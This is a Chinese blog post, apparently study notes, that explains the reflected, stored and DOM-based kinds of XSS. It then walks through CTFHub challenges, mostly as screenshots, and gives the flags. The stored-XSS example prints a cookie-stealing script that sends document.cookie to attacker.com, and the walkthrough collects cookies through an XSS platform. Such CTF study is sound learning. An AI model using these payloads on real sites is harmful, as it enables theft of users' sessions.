+++
title = "XSS"
icon = "article"
toc = true
+++
# XSS

## 漏洞原理

> Web 应用程序在处理用户输入时，没有对输入进行充分的过滤和转义，直接将用户输入的内容输出到页面中，攻击者就可以利用这个漏洞注入恶意脚本。

例如，一个留言板应用程序直接将用户输入的留言显示在页面上，如果攻击者输入一段 JavaScript 代码，当其他用户访问该留言板时，这段代码就会在他们的浏览器中执行。

## 漏洞类型
### 反射型 XSS
**特点**：攻击者诱使用户点击包含恶意脚本的链接，服务器接收请求后将恶意脚本反射回用户的浏览器并执行。这种攻击通常是一次性的，不会在服务器上存储恶意脚本。
**示例**：一个搜索页面，URL 参数直接显示在搜索结果页面上。攻击者构造一个包含恶意脚本的 URL，如http://example.com/search?keyword=<script>alert('XSS')</script>。

### 存储型 XSS

**特点**：攻击者将恶意脚本提交到服务器并存储在数据库中，当其他用户访问包含该恶意脚本的页面时，脚本会在他们的浏览器中执行。这种攻击危害更大，因为它会影响多个用户。
**示例**：在一个论坛的留言功能中，攻击者在留言内容中注入恶意脚本，如<script>document.location='http://attacker.com?cookie='+document.cookie</script>。当其他用户查看该留言时，脚本会将他们的 Cookie 信息发送到攻击者的服务器。

### DOM 型 XSS
**特点**：基于 DOM（文档对象模型）的 XSS 攻击，不依赖服务器端处理，而是通过修改页面的 DOM 结构来注入恶意脚本。攻击者通过诱导用户访问包含恶意脚本的 URL，当页面加载时，脚本会在浏览器中执行。
**示例**：一个页面使用 JavaScript 动态更新内容，根据 URL 参数修改页面元素。攻击者构造一个包含恶意脚本的 URL，如http://example.com/page.html?param=<script>alert('XSS')</script>，当用户访问该 URL 时，脚本会在浏览器中执行。

# 题目

## 反射型

![image-20250411201914007.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a30ead989fa77045aca2dff052ba4e85bc?version=1.0&width=2046&height=1536)

![image-20250411201926443.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a38714a419e39742099d717f732da8ac94?version=1.0&width=2046&height=1536)

在第一个输入框输入内容后，下面会显示。我看别人的wp中的js中写入alert语句都能被执行，我的直接冲定向了

![image-20250411202449543.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a377f4147f64bd4076bb6b525e9e015c1b?version=1.0&width=2046&height=1536)

![image-20250411202458622.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3d78919447ef3447d8128750b3c019913?version=1.0&width=2046&height=1536)

定义一个变量试一下

![image-20250411203941227.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a38088676e8a734aafaa97a82f364c9af3?version=1.0&width=2046&height=1536)

被执行了

![image-20250411204009304.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a321c2604de6ff4006b5a00ce9b10d1f04?version=1.0&width=2046&height=1536)

接着找个XSS平台，将url填入

![image-20250411205731085.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3787872f7e3d14779953cd53bc30bcd8e?version=1.0&width=2046&height=1536)

不知道为啥，使用火狐是得不到cookie，最后用的Edge

![image-20250411205620592.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a340309c5761f14c2997521f259eb33cea?version=1.0&width=2046&height=1536)

**flag:ctfhub{8bc9faaca0589642c67759de}**

## 存储型

![image-20250411210859339.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a309e92fbed15f4539a4b609d0a0b0c5f7?version=1.0&width=2046&height=1536)

和上题类似，先测试一下

![image-20250411210930754.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3bcf513e073ea4d46abfdfc54450524b9?version=1.0&width=2046&height=1536)

![image-20250411210947151.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a38e8cf1c056c040629f3c91566b4e33e9?version=1.0&width=2046&height=1536)

在第一个框中填入项目的地址

![image-20250411211238058.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3b552f89d022b47eab1e2aa949097260c?version=1.0&width=2046&height=1536)

第二个框填入当前页的url

![image-20250411211358963.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a323cfe41343d54965b4ade8a887086371?version=1.0&width=2046&height=1536)

看一下XSS平台的后台

![image-20250411211453422.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a38bfca430f7f24ceab2095f9318d678a6?version=1.0&width=2046&height=1536)

**flag:ctfhub{3481284913c5d18b9fdcdb77}**

## DOM反射

![image-20250411211920380.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a34a2ab84d1fdb4e0088382ad8b3e07363?version=1.0&width=2046&height=1536)

题目说了是DOM反射，看源码

![image-20250411212021827.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3a2f14dfd8637474c86272a888990561e?version=1.0&width=2046&height=1536)

填入1试试

![image-20250411211942888.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3182338ad252f43e193e8c43c1c0749e4?version=1.0&width=2046&height=1536)

![image-20250411212233372.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a35329d0b993c347fab5dec9f2399e31ef?version=1.0&width=2046&height=1536)

中间加个**‘；**

![image-20250411212428413.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a384c4524f2bf34fd19c3e5e976362d259?version=1.0&width=2046&height=1536)

链接交上去

![image-20250411212450981.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3a0e5f01cb14f40d084126d5239f5fef6?version=1.0&width=2046&height=1536)

去看一下

![image-20250413181505021.png](https://previewengine.zohopublic.com.cn/image/WD/rb2a3dc1ed476de74427f83b59182e023a932?version=1.0&width=2046&height=1536)
